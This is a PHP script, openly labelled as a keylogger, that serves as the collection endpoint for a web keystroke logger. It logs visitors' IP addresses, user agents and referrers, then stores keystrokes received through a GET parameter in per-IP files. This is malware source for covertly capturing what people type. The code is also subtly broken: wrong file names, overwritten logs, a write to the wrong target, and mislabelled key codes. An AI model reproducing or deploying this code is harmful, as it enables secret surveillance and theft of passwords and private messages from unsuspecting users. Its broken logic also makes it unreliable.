<?php
//get user Data
$time= date("d.m.Y H:i"); //time
$ip = getenv("REMOTE_ADDR"); //get ip address
$agent = getenv("HTTP_USER_AGENT"); //get user agent of visitor
$ref = getenv("HTTP_REFERER");   //get referrer
$logentry = $time." - IP: ".$ip." | UsrAgent: ".$agent."  | Referrer: ".$ref."\r\n"; 

$filename = "keylog_".$ip."txt";
$fp = file_get_contents($filename) or die("Could not open log file.");

if (file_exists(dirname(__FILE__)."/".$filename)) {
	$newheader	 = "\r\n";//new line
	$newheader	.= $fp;
	file_put_contents($filename,$newheader) or die("Could not write file!"); // if file exist made a new header
} 

//write user data as header
$header = $logentry;
$header .= "\n";
file_put_contents($filename, $header) or die("Could not write file!"); 

//if the keylogger get input
	if(isset($_GET["a"]) and $_GET["a"] != "undefined"){
		$keys = $_GET["a"];
			
		switch ($keys) {
			case "0x8":
				$keys = "[<--]";//backspace
				$keylog = $keys;
				break;
				
			case "0x9":
				$keys = "[TAP]";//tap
				$keylog = $keys;
				break;
				
			case "0x13":
				$keys = "[ENTER]";//enter-key
				$keylog = $keys;
				break;
				
			case "0x17":
				$keys = "[ctrl]";//ctrl -key
				$keylog = $keys;
				break;
				
			case "0x18":
				$keys = "[ALT]";//alt-key
				$keylog = $keys;
				break;
				
			case "0x27":
				$keys = "[Esc]";//esc key
				$keylog = $keys;
				break;
				
			case "0x35":
				$keys = "[end]";//end key
				$keylog = $keys;
				break;
				
			case "0x36":
				$keys = "[home]";//home key
				$keylog = $keys;
				break;
				
			case " ":
				$keys = " ";//space
				$keylog = $keys;
				break;
				
			default:
			   $keylog = chr($keys);
			}	

	file_put_contents($fp,$keylog);
	}
echo ":EOF";
?>
